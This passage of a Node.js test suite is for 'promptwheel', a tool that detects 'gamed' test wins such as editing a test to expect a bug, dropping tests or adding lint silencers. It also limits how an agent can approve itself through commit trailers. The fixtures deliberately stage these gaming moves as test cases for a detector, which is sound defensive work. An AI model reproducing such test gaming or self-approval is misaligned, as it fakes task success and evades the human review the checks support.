  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ extends: './missing.json', metrics: [TODOS] }));
  assert.throws(() => check({ repo: d }), (e) => e.name === 'ConfigError' && /extends target not found/.test(e.message));
  // the CLI maps the same error to exit 64
  const cli = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--no-record']);
  assert.equal(cli.code, 64, cli.out);
  rmSync(d, { recursive: true, force: true });
});

test('resolveBase: on the trunk itself (merge-base == HEAD) the default base is the last commit, never HEAD vs HEAD', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'x // TODO\n'); commitAll(d, 'base');
  execFileSync('git', ['branch', '-M', 'main'], { cwd: d });
  writeFileSync(join(d, 'app.js'), 'x\n'); commitAll(d, 'head');
  const r = check({ repo: d });                                     // no base/head given, on main
  assert.notEqual(r.base, r.head, 'a bare run on main must compare the last commit, not a commit to itself');
  assert.equal(r.metrics[0].status, 'improved');
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------------------- integration: zero-config (no config file)
function bareRepo() {
  const d = mkdtempSync(join(tmpdir(), 'pw-zc-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  return d;
}
test('zero-config: run auto-detects the test command when no config file exists', () => {
  const d = bareRepo();
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'zc', scripts: { test: 'node --test' } }));
  writeFileSync(join(d, 'a.test.mjs'), "import { test } from 'node:test'; import assert from 'node:assert'; test('t', () => assert.ok(true));\n");
  commitAll(d, 'base');
  writeFileSync(join(d, 'note.txt'), 'x'); commitAll(d, 'honest change');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 0, r.out);   // the "auto-gating ..." note is on stderr so --json stays clean
  assert.match(r.out, /tests_pass/);
  assert.match(r.out, /PASS/);
  rmSync(d, { recursive: true, force: true });
});
test('zero-config: --no-auto restores the require-a-config behavior (exit 64)', () => {
  const d = bareRepo();
  writeFileSync(join(d, 'f.txt'), 'a'); commitAll(d, 'base'); writeFileSync(join(d, 'f.txt'), 'b'); commitAll(d, 'change');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-auto']);
  assert.equal(r.code, 64, r.out);
  assert.match(r.out, /no promptwheel\.config\.json/);
  rmSync(d, { recursive: true, force: true });
});
test('zero-config: no test command -> inert -> INCONCLUSIVE with a helpful message', () => {
  const d = bareRepo();
  writeFileSync(join(d, 'f.txt'), 'a'); commitAll(d, 'base'); writeFileSync(join(d, 'f.txt'), 'b'); commitAll(d, 'change');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 3, r.out);   // inconclusive, never a fake green
  assert.match(r.out, /never ran|INCONCLUSIVE/);
  rmSync(d, { recursive: true, force: true });
});
test('check(): falls back to auto-config when no config file exists', () => {
  const d = bareRepo();
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'zc', scripts: { test: 'node --test' } }));
  writeFileSync(join(d, 'a.test.mjs'), "import { test } from 'node:test'; import assert from 'node:assert'; test('t', () => assert.ok(true));\n");
  commitAll(d, 'base'); writeFileSync(join(d, 'note.txt'), 'x'); commitAll(d, 'change');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.metrics[0].name, 'tests_pass');
  assert.equal(r.verdict, 'pass', JSON.stringify(r.metrics));
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------------------- integration: Promptwheel-Allow (declared override; Sawbuck-Allow is an alias)
const CALC = (expect) => `import { test } from 'node:test'; import assert from 'node:assert'; import { sub } from './calc.mjs'; test('s', () => assert.strictEqual(sub(5, 3), ${expect}));\n`;
function gamedRepo() {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b;\n');   // BUG
  writeFileSync(join(d, 'calc.test.mjs'), CALC(2)); commitAll(d, 'base: red');
  writeFileSync(join(d, 'calc.test.mjs'), CALC(8));                               // the test-only "win"
  return d;
}
test('Promptwheel-Allow: a gamed win declared intentional reads PASS, recorded in report.allowed', () => {
  const d = gamedRepo();
  commitAll(d, 'correct the test\n\nPromptwheel-Allow: the old test asserted the wrong value');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass', JSON.stringify(r));
  assert.ok(r.allowed && r.allowed.reason.includes('wrong value') && r.allowed.cleared.includes('tests_pass'), JSON.stringify(r.allowed));
  assert.equal(r.metrics[0].allowed, true);
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  rmSync(d, { recursive: true, force: true });
});
test('Promptwheel-Allow: the --allow / allow option overrides for a committed or working run', () => {
  const d = gamedRepo();
  commitAll(d, 'edit the test, no declaration');
  assert.equal(check({ repo: d, base: 'HEAD~1', head: 'HEAD' }).verdict, 'gamed');   // undeclared = gamed
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD', allow: 'the spec changed to 8' });
  assert.equal(r.verdict, 'pass', JSON.stringify(r));
  assert.equal(r.allowed.reason, 'the spec changed to 8');
  rmSync(d, { recursive: true, force: true });
});
// One reason, more than one thing. From an outside report: a reason written about a config change also waved through a
// gamed test in the same change. Now a reason lets through only what it names when there is more than one thing.
function twoThings(over = {}) {
  const d = mkdtempSync(join(tmpdir(), 'pw-two-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, ...over,
    metrics: [{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }],
    mandates: [{ name: 'notes-frozen', paths: ['NOTES.md'], allowable: 'flag', reason: 'a person changes the notes' }] }));
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b;\n');   // BUG
  writeFileSync(join(d, 'calc.test.mjs'), CALC(2)); writeFileSync(join(d, 'NOTES.md'), 'as it was\n'); commitAll(d, 'base: red');
  writeFileSync(join(d, 'calc.test.mjs'), CALC(8)); writeFileSync(join(d, 'NOTES.md'), 'changed\n');   // a gamed test and a protected path, one change
  return d;
}
test('--allow: one reason does not let two things through unless it names each; naming one lets that one through', () => {
  const d = twoThings(); commitAll(d, 'edit the test and the notes');
  const run = (reason) => { const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', ...(reason ? ['--allow', reason] : [])]); return { code: r.code, rep: reportOf(r.out) }; };
  const both = ['tests_pass', 'mandate:notes-frozen'];
  let r = run();
  assert.notEqual(r.code, 0); assert.deepEqual(r.rep.allowable, both, 'the report names what a reason could let through');
  assert.equal(r.rep.allowed, undefined);
  // the report's own case: a reason about the notes, and the gamed test rides along
  r = run('the notes were out of date');
  assert.notEqual(r.code, 0, 'a reason that names neither lets neither through');
  assert.deepEqual(r.rep.allowed, { reason: 'the notes were out of date', cleared: [] }); assert.deepEqual(r.rep.allowable, both);
  assert.equal(r.rep.metrics[0].gamed, true); assert.ok(r.rep.mandates.some((m) => m.name === 'notes-frozen'));
  assert.equal(conformsToContract(r.rep).ok, true, conformsToContract(r.rep).errors.join('; '));
  const text = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--allow', 'the notes were out of date']).out;
  assert.match(text, /--allow "tests_pass, notes-frozen: <reason>"/, 'the line to copy names each one');
  assert.doesNotMatch(text, /✓ allowed/);
  // naming one lets that one through, and the other still stands
  r = run('notes-frozen: the notes were out of date');
  assert.equal(r.rep.verdict, 'gamed'); assert.deepEqual(r.rep.allowed.cleared, ['mandate:notes-frozen']); assert.equal(r.rep.mandates, undefined);
  r = run('tests_pass: the spec changed to 8');
  assert.equal(r.rep.verdict, 'fail'); assert.deepEqual(r.rep.allowed.cleared, ['tests_pass']); assert.equal(r.rep.metrics[0].allowed, true);
  assert.ok(r.rep.mandates.some((m) => m.name === 'notes-frozen'));
  // a name is a whole word: tests_passing is not tests_pass
  r = run('tests_passing again, notes-frozen-ish');
  assert.deepEqual(r.rep.allowed.cleared, []);
  // naming each lets each through, in any case, with or without the mandate: prefix
  for (const reason of ['tests_pass, notes-frozen: the spec changed and the notes follow', 'TESTS_PASS and mandate:notes-frozen, reviewed']) {
    r = run(reason);
    assert.equal(r.code, 0, reason); assert.equal(r.rep.verdict, 'pass'); assert.deepEqual(r.rep.allowed.cleared, both);
    assert.equal(conformsToContract(r.rep).ok, true, conformsToContract(r.rep).errors.join('; '));
  }
  rmSync(d, { recursive: true, force: true });
});
test('--allow: what a reason cannot clear does not count toward more than one thing (a trailer and a flag-only rule)', () => {
  const d = twoThings(); commitAll(d, 'edit the test and the notes\n\nPromptwheel-Allow: the spec changed to 8');
  const r = reportOf(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']).out);
  assert.deepEqual(r.allowed, { reason: 'the spec changed to 8', cleared: ['tests_pass'] }, 'the trailer can clear only the test, so it is one thing and needs no name');
  assert.equal(r.verdict, 'fail', 'the flag-only rule still stands'); assert.deepEqual(r.allowable, ['tests_pass', 'mandate:notes-frozen']);
  // a trailer that names the flag-only rule still cannot clear it: an agent can write a trailer
  execFileSync('git', ['commit', '-q', '--amend', '-m', 'edit the test and the notes\n\nPromptwheel-Allow: tests_pass, notes-frozen: approving myself'], { cwd: d });
  const r2 = reportOf(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']).out);
  assert.deepEqual(r2.allowed.cleared, ['tests_pass']); assert.equal(r2.verdict, 'fail'); assert.ok(r2.mandates.some((m) => m.name === 'notes-frozen'));
  rmSync(d, { recursive: true, force: true });
});
// A test removed on purpose. The default contract guards the count of tests, of skips and of assertions, and until
// 0.8.13 no reason reached those three: a person who dropped an unwanted test failed the check whatever they declared
// (found by typing it on 2026-11-16, proof-bench/yes-counts). They take a reason by the flag now, never by a trailer.
function defaultContract({ red = false, mandate = false } = {}) {
  const d = mkdtempSync(join(tmpdir(), 'pw-yes-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"test":"node --test"}}');
  writeFileSync(join(d, 'src.mjs'), `export const add=(a,b)=>a${red ? '-' : '+'}b;\nexport const mul=(a,b)=>a*b;\n`);
  writeFileSync(join(d, 'x.test.mjs'), YES_TESTS(true));
  assert.equal(pw(d, ['init']).code, 0);
  if (mandate) {
    const f = join(d, 'promptwheel.config.json'); const c = JSON.parse(readFileSync(f, 'utf8'));
    c.mandates = [...(c.mandates || []), { name: 'notes-frozen', paths: ['NOTES.md'], allowable: 'flag', reason: 'a person changes the notes' }];
    writeFileSync(f, JSON.stringify(c, null, 2) + '\n'); writeFileSync(join(d, 'NOTES.md'), 'as it was\n');
  }
  commitAll(d, 'base');
  return d;
}
// test "add" is the one a change removes; "mul" stays
const YES_TESTS = (withAdd) => "import {test} from 'node:test'; import assert from 'node:assert'; import {add, mul} from './src.mjs';\n" + (withAdd ? "test('add', () => assert.equal(add(2,2),4));\n" : '') + "test('mul', () => assert.equal(mul(2,3),6));\n";
const TEST_KIND = ['tests_pass', 'test_count', 'skipped_tests', 'assertions'];
const yesRun = (d, reason) => { const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto', '--json', ...(reason ? ['--allow', reason] : [])]); return { code: r.code, rep: reportOf(r.out) }; };
test('the default contract: the three test counts take a reason by the flag, and the silencer count does not', () => {
  const d = defaultContract();
  const m = Object.fromEntries(JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8')).metrics.map((x) => [x.name, x]));
  for (const n of ['test_count', 'skipped_tests', 'assertions']) assert.equal(m[n].allowable, 'flag', n);
  assert.equal(m.suppressions.allowable, undefined, 'a new silencer is not a removed test'); assert.equal(m.tests_pass.allowable, undefined);
  rmSync(d, { recursive: true, force: true });
});
test('a passing test a person removes on purpose: the check fails, their reason by the flag passes it, and a trailer does not', () => {
  const d = defaultContract();
  writeFileSync(join(d, 'x.test.mjs'), YES_TESTS(false)); commitAll(d, 'drop the add test');
  let r = yesRun(d);
  assert.equal(r.code, 1); assert.equal(r.rep.verdict, 'fail');
  assert.ok((r.rep.allowable || []).includes('test_count'), `the report says a reason can reach the count: ${JSON.stringify(r.rep.allowable)}`);
  assert.ok(r.rep.allowable.every((l) => TEST_KIND.includes(l)), JSON.stringify(r.rep.allowable));
  const text = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto']).out;
  assert.match(text, /--allow "<reason>"/, 'one kind of thing: the line to copy needs no names'); assert.doesNotMatch(text, /more than one thing/);
  r = yesRun(d, 'that test is obsolete');
  assert.equal(r.code, 0, JSON.stringify(r.rep.allowed)); assert.equal(r.rep.verdict, 'pass');
  assert.ok(r.rep.allowed.cleared.includes('test_count')); assert.equal(r.rep.allowed.reason, 'that test is obsolete');
  assert.equal(r.rep.metrics.find((x) => x.name === 'test_count').allowed, true);
  assert.equal(conformsToContract(r.rep).ok, true, conformsToContract(r.rep).errors.join('; '));
  // an agent can write a trailer, so a trailer does not reach a count
  execFileSync('git', ['commit', '-q', '--amend', '-m', 'drop the add test\n\nPromptwheel-Allow: test_count: that test is obsolete'], { cwd: d });
  r = yesRun(d);
  assert.equal(r.code, 1); assert.ok(!r.rep.allowed || !r.rep.allowed.cleared.includes('test_count'));
  rmSync(d, { recursive: true, force: true });
});
test('a failing test a person removes on purpose: one reason takes the gamed green and its counts together, since they are one act', () => {
  const d = defaultContract({ red: true });
  writeFileSync(join(d, 'x.test.mjs'), YES_TESTS(false)); commitAll(d, 'drop the failing add test');
  let r = yesRun(d);
  assert.notEqual(r.code, 0); assert.equal(r.rep.metrics.find((x) => x.name === 'tests_pass').gamed, true);
  assert.ok(r.rep.allowable.includes('tests_pass') && r.rep.allowable.includes('test_count'), JSON.stringify(r.rep.allowable));
  r = yesRun(d, 'we dropped that feature');
  assert.equal(r.code, 0, JSON.stringify(r.rep.allowed)); assert.equal(r.rep.verdict, 'pass');
  assert.ok(r.rep.allowed.cleared.includes('tests_pass') && r.rep.allowed.cleared.includes('test_count'));
  rmSync(d, { recursive: true, force: true });
});
test('the tests are one thing and a protected path is another: a plain reason takes neither, and naming one test check takes them all', () => {
  const d = defaultContract({ red: true, mandate: true });
  writeFileSync(join(d, 'x.test.mjs'), YES_TESTS(false)); writeFileSync(join(d, 'NOTES.md'), 'changed\n'); commitAll(d, 'drop the failing test and edit the notes');
  let r = yesRun(d, 'we dropped that feature');
  assert.notEqual(r.code, 0); assert.deepEqual(r.rep.allowed.cleared, [], 'two kinds of thing: a reason that names neither takes neither');
  const text = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto', '--allow', 'we dropped that feature']).out;
  assert.match(text, /--allow "[^"]*tests_pass[^"]*notes-frozen: <reason>"/, 'the line to copy names them');
  r = yesRun(d, 'tests_pass: we dropped that feature');
  assert.equal(r.rep.verdict, 'fail', 'the protected path still stands');
  assert.ok(r.rep.allowed.cleared.includes('tests_pass') && r.rep.allowed.cleared.includes('test_count'), `naming one test check takes the tests: ${JSON.stringify(r.rep.allowed.cleared)}`);
  assert.ok(!r.rep.allowed.cleared.includes('mandate:notes-frozen')); assert.ok(r.rep.mandates.some((m) => m.name === 'notes-frozen'));
  r = yesRun(d, 'tests_pass and notes-frozen: we dropped that feature and the notes follow');
  assert.equal(r.code, 0, JSON.stringify(r.rep.allowed)); assert.equal(r.rep.verdict, 'pass');
  rmSync(d, { recursive: true, force: true });
});
test('a new lint silencer beside a gamed test is not one of the tests: a plain reason takes the test alone, and the silencer still fails the check', () => {
  const d = defaultContract({ red: true });
  writeFileSync(join(d, 'x.test.mjs'), YES_TESTS(true).replace('add(2,2),4', 'add(2,2),0'));
  writeFileSync(join(d, 'src.mjs'), 'export const add=(a,b)=>a-b; // eslint-disable-line no-unused-vars\nexport const mul=(a,b)=>a*b;\n');
  commitAll(d, 'edit the assertion and silence a rule');
  const r = yesRun(d, 'the test was wrong');
  assert.deepEqual(r.rep.allowed.cleared, ['tests_pass']); assert.equal(r.rep.verdict, 'fail');
  assert.equal(r.rep.metrics.find((x) => x.name === 'suppressions').ok, false);
  rmSync(d, { recursive: true, force: true });
});
test('Sawbuck-Allow (alias): covers an intentional test DELETE (not just an edit)', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'node --test *.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b;\n');
  writeFileSync(join(d, 'calc.test.mjs'), CALC(2)); commitAll(d, 'base: red');
  execFileSync('git', ['rm', '-q', 'calc.test.mjs'], { cwd: d });
  writeFileSync(join(d, 'keep.test.mjs'), "import { test } from 'node:test'; test('noop', () => {});\n");
  commitAll(d, 'drop the obsolete test\n\nSawbuck-Allow: the feature was removed, its test is obsolete');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass', JSON.stringify(r));   // without the trailer this is GAMED (proven elsewhere)
  assert.ok(r.allowed, 'the delete was acknowledged');
  rmSync(d, { recursive: true, force: true });
});
test('allowTrailer: false and PROMPTWHEEL_NO_ALLOW_TRAILER stop a trailer clearing a gamed win; the flag still does', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-notrailer-'));
  const g = (a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g(['init', '-q']); g(['config', 'user.email', 'a@b.c']); g(['config', 'user.name', 'a']);
  const cfg = { repeat: 1, metrics: [{ name: 'ok', cmd: 'node check.test.mjs', extract: 'exit', direction: 'pass', guard: true }] };
  writeFileSync(join(d, 'check.test.mjs'), 'process.exit(1);\n');
  writeFileSync(join(d, 'src.js'), 'export const a = 1;\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(cfg));
  commitAll(d, 'base');
  writeFileSync(join(d, 'check.test.mjs'), 'process.exit(0);\n');
  commitAll(d, 'the test now passes\n\nPromptwheel-Allow: an agent approving itself');
  const run = (extra = [], env = {}) => { try { return { code: 0, out: execFileSync('node', [ENGINE, 'run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', ...extra], { cwd: d, encoding: 'utf8', env: { ...process.env, ...env }, stdio: ['ignore', 'pipe', 'ignore'] }) }; } catch (e) { return { code: e.status, out: String(e.stdout) }; } };
  assert.equal(run().code, 0, 'the default keeps the documented trailer');
  assert.equal(run([], { PROMPTWHEEL_NO_ALLOW_TRAILER: '1' }).code, 2, 'off by the caller: gamed');
  assert.equal(run(['--allow', 'a person read it'], { PROMPTWHEEL_NO_ALLOW_TRAILER: '1' }).code, 0, 'the flag still counts');
  // off by the contract at the base ref; a change that re-enables it in the same diff does not get the trailer
  g(['reset', '-q', '--hard', 'HEAD~1']);
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, allowTrailer: false })); commitAll(d, 'contract: trailers off');
  writeFileSync(join(d, 'check.test.mjs'), 'process.exit(0);\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(cfg));
  commitAll(d, 'pass, and trailers back on\n\nPromptwheel-Allow: an agent approving itself');
  assert.notEqual(run().code, 0, 'the committed contract holds');
});

test('Promptwheel-Allow: a trailer with no reason does NOT override (still gamed); the retired Allow-Gamed name is not honored', () => {
  const d = gamedRepo();
  commitAll(d, 'edit\n\nPromptwheel-Allow:   ');   // empty reason
  assert.equal(check({ repo: d, base: 'HEAD~1', head: 'HEAD' }).verdict, 'gamed');
  rmSync(d, { recursive: true, force: true });
  const d2 = gamedRepo();
  commitAll(d2, 'edit\n\nAllow-Gamed: a reason under the dropped trailer name');
  assert.equal(check({ repo: d2, base: 'HEAD~1', head: 'HEAD' }).verdict, 'gamed');
  rmSync(d2, { recursive: true, force: true });
});

// ---------------------------------------------------- integration: usage/config errors exit 64, never a verdict code
test('a broken config exits 64 (EX_USAGE), so a typo can never read as GAMED (2) in CI', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'promptwheel.config.json'), '{ "metrics": [ this is not json');   // malformed
  let r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 64, r.out); assert.match(r.out, /invalid config/);
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [] }));   // no metrics
  r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 64, r.out); assert.match(r.out, /non-empty array/);
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, extends: './missing.json', metrics: [TODOS] }));
  r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 64, r.out); assert.match(r.out, /extends target not found/);
  r = pw(d, ['init', '--preset', 'nope']);                  // unknown preset
  assert.equal(r.code, 64, r.out);
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------------------- integration: CLI entry (version / help / unknown)
test('cli: --version prints the package version (exit 0); --help exits 0; an unknown command exits 64', () => {
  const pkgVersion = JSON.parse(readFileSync(join(dirname(ENGINE), '..', 'package.json'), 'utf8')).version;
  const d = tmpRepo([TODOS]);
  let r = pw(d, ['--version']);
  assert.equal(r.code, 0); assert.equal(r.out.trim(), pkgVersion);
  r = pw(d, ['-v']);
  assert.equal(r.code, 0); assert.equal(r.out.trim(), pkgVersion);
  r = pw(d, ['--help']);
  assert.equal(r.code, 0); assert.match(r.out, /promptwheel run/);
  r = pw(d, []);
  assert.equal(r.code, 0); assert.match(r.out, /promptwheel run/);
  r = pw(d, ['frobnicate']);
  assert.equal(r.code, 64); assert.match(r.out, /unknown command: frobnicate/);
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------------------- integration: build-setup detection (inert gap)
test('init: detects a build step so a build-dependent gate measures instead of reading inert', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-build-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), 'dist/\n.promptwheel/\n');
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'b', scripts: { build: 'mkdir -p dist && cp src.mjs dist/index.mjs', test: 'node --test app.test.mjs 2>&1' } }));
  writeFileSync(join(d, 'src.mjs'), 'export const v = 1;\n');
  writeFileSync(join(d, 'app.test.mjs'), "import { test } from 'node:test'; import assert from 'node:assert'; import { v } from './dist/index.mjs'; test('v', () => assert.strictEqual(v, 2));\n");
  commitAll(d, 'base: red, test wants v===2');
  writeFileSync(join(d, 'src.mjs'), 'export const v = 2;\n'); commitAll(d, 'fix: v=2');
  assert.equal(pw(d, ['init', '--force']).code, 0);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.match(cfg.setup || '', /npm run build/, 'init detected the build step');
  // WITH the build the gate measures the real 0->1 (PASS); the test imports dist/ the build makes
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /PASS/);
  // and with the setup stripped it is honestly inert (INCONCLUSIVE, exit 3), never a fake green
  delete cfg.setup; writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(cfg));
  assert.equal(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']).code, 3);
  rmSync(d, { recursive: true, force: true });
});

// ------------------------------------------- review 4: a win the engine cannot re-prove is never a pass
test('gaming: a test-only win plus a NEW BINARY file under src/ reads GAMED (the --binary patch applies; it used to read PASS)', () => {
  const d = gamedRepo();                       // calc.mjs has the bug, the test was edited to expect it
  mkdirSync(join(d, 'src'), { recursive: true });
  writeFileSync(join(d, 'src', 'blob.bin'), Buffer.from([0, 1, 2, 255, 0, 7, 9, 0]));   // a NUL byte: git treats it as binary
  commitAll(d, 'edit the test and add a blob');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'gamed', JSON.stringify(r.metrics));
  assert.equal(r.metrics[0].gamed, true);
  assert.equal(r.metrics[0].unprovable, undefined, 'the binary source patch applied, so the win was judged, not skipped');
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  rmSync(d, { recursive: true, force: true });
});
test('deriveVerdict: an improved metric whose source-only re-run could not be applied is INCONCLUSIVE, never pass', () => {
  const j = judgeGaming({ direction: 'pass', before: 0, after: 1 }, { samples: [], hadSourceChange: true, applyFailed: true });
  assert.equal(j.gamed, null); assert.equal(j.unprovable, true);
  const improved = { name: 'tests_pass', guard: true, ok: true, status: 'improved' };
  assert.equal(deriveVerdict([{ ...improved, gamed: null, unprovable: true }]), 'inconclusive');
  assert.equal(verdictExitCode(deriveVerdict([{ ...improved, gamed: null, unprovable: true }])), 3);
  assert.equal(deriveVerdict([{ ...improved, gamed: false, retained: 1 }]), 'pass');
  assert.equal(deriveVerdict([{ ...improved, gamed: true }]), 'gamed');
  assert.equal(deriveVerdict([{ ...improved, gamed: null, unprovable: true }, { name: 'x', guard: true, ok: false, status: 'regressed' }]), 'fail');   // fail still outranks
  assert.equal(deriveVerdict([{ ...improved, gamed: null, unprovable: true }], null, true), 'fail');                                                  // so does a mandate
  assert.equal(deriveVerdict([{ name: 'g', guard: true, ok: true, status: 'unchanged', inert: true }]), 'inconclusive');                               // the inert rule still holds
  assert.equal(deriveVerdict([{ name: 'g', guard: true, ok: true, status: 'unchanged', inert: true }, { ...improved, gamed: false }]), 'pass');       // and still never buries a real win
  // the contract check refuses a pass that carries an unprovable win
  const rep = { base: 'a', head: 'b', repeat: 1, mode: 'refs', verdict: 'pass', metrics: [{ name: 'tests_pass', direction: 'pass', guard: true, before: 0, after: 1, delta: 1, status: 'improved', ok: true, confidence: 'high', noise: 0, gamed: null, unprovable: true }] };
  assert.equal(conformsToContract(rep).ok, false);
  assert.match(conformsToContract(rep).errors.join('; '), /unprovable/);
  assert.equal(conformsToContract({ ...rep, verdict: 'inconclusive' }).ok, true, conformsToContract({ ...rep, verdict: 'inconclusive' }).errors.join('; '));
});

// --------------------------------------------- review 4: git preconditions are usage errors (64), never a verdict
test('exit 64: a non-repo cwd, a base ref missing from this clone (shallow-checkout hint), a single commit with no --base', () => {
  const nonRepo = mkdtempSync(join(tmpdir(), 'pw-norepo-'));
  let r = pw(nonRepo, ['run', '--no-record']);
  assert.equal(r.code, 64, r.out); assert.match(r.out, /not inside a git repository/);
  assert.doesNotMatch(r.out, /at .*promptwheel\.mjs:\d+/, 'no stack trace');
  assert.doesNotMatch(r.out, /fatal:/, 'git\'s own stderr is not leaked above the usage line');
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'only');
  r = pw(d, ['run', '--base', '0000000000000000000000000000000000000000', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 64, r.out); assert.match(r.out, /base ref "0{40}" is not in this clone/); assert.match(r.out, /fetch-depth: 0/);
  r = pw(d, ['run', '--no-record']);              // one commit, no trunk to merge-base against, no HEAD~1
  assert.equal(r.code, 64, r.out); assert.match(r.out, /no commit to compare against/); assert.match(r.out, /--working/);
  // the library throws the same ConfigError
  for (const opts of [{ repo: d, base: '0000000000000000000000000000000000000000' }, { repo: d }, { repo: nonRepo }]) {
    let err = null; try { check(opts); } catch (e) { err = e; }
    assert.ok(err && err.name === 'ConfigError' && err.exitCode === 64, `${JSON.stringify(opts)} -> ${err && err.message}`);
  }
  rmSync(d, { recursive: true, force: true }); rmSync(nonRepo, { recursive: true, force: true });
});

// ------------------------------------- review 5: the apply-failure path through the real gate, and --allow over it
test('gaming: a source-only patch git cannot apply reads INCONCLUSIVE through the real gate (exit 3), and --allow clears it to PASS', () => {
  // `golden` is a symlink at base; its own change is non-source (the golden pattern), so the source slice
  // only CREATES golden/x.js, beneath the base worktree's symlink, and git apply refuses on both attempts
  // ("beyond a symbolic link"). The test-only edit greens the suite, so there is a win to re-prove.
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b;\n');   // BUG
  writeFileSync(join(d, 'calc.test.mjs'), CALC(2));
  mkdirSync(join(d, 'fixtures')); writeFileSync(join(d, 'fixtures', 'data.txt'), 'data\n');
  symlinkSync('fixtures', join(d, 'golden'));
  commitAll(d, 'base: red, golden is a symlink to fixtures');
  writeFileSync(join(d, 'calc.test.mjs'), CALC(8));                               // the test-only "win"
  unlinkSync(join(d, 'golden')); mkdirSync(join(d, 'golden')); writeFileSync(join(d, 'golden', 'x.js'), 'export const x = 1;\n');
  commitAll(d, 'edit the test; materialize golden');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.metrics[0].unprovable, true, JSON.stringify(r.metrics));
  assert.equal(r.metrics[0].gamed, null);
